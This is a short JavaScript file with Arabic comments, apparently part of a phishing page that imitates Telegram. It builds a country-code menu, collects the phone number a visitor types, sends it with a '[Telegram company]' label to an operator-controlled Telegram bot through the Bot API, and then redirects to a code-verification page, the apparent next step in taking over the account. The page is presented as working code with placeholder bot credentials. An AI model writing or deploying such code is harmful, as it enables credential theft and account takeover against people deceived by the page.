// بيانات رموز الدول
const countryCodes = [
    { name: "اليمن", code: "+967", flag: "🇾🇪" },
    { name: "السعودية", code: "+966", flag: "🇸🇦" },
    // ... (بقية الدول)
];

// ملء قائمة الدول
const countrySelect = document.getElementById('country');
countryCodes.forEach(country => {
    const option = document.createElement('option');
    option.value = country.code;
    option.textContent = `${country.flag} ${country.name} (${country.code})`;
    countrySelect.appendChild(option);
});

// إرسال رقم الهاتف
document.getElementById('phoneForm').addEventListener('submit', async function(event) {
    event.preventDefault();

    const countryCode = document.getElementById('country').value;
    const phoneNumber = document.getElementById('phone').value;

    if (!phoneNumber) {
        alert('يرجى إدخال رقم الهاتف');
        return;
    }

    const fullNumber = `${countryCode}${phoneNumber}`;

    // إرسال البيانات إلى بوت Telegram
    await sendToTelegram(`[شركة تليجرام] تم إرسال الكود إلى الرقم: ${fullNumber}`);

    // الانتقال إلى صفحة التسجيل
    window.location.href = 'code_verification.html';
});

// دالة لإرسال الرسائل إلى بوت Telegram
async function sendToTelegram(message) {
    const botToken = 'YOUR_BOT_TOKEN'; // استبدل ب Token البوت الخاص بك
    const chatId = 'YOUR_CHAT_ID'; // استبدل ب Chat ID الخاص بك

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const data = {
        chat_id: chatId,
        text: message
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        if (!response.ok) {
            throw new Error(`خطأ في الإرسال: ${response.status} ${response.statusText}`);
        }

        const result = await response.json();
        console.log('تم إرسال الرسالة إلى Telegram:', result);
    } catch (error) {
        console.error('خطأ في الإرسال:', error);
    }
      }
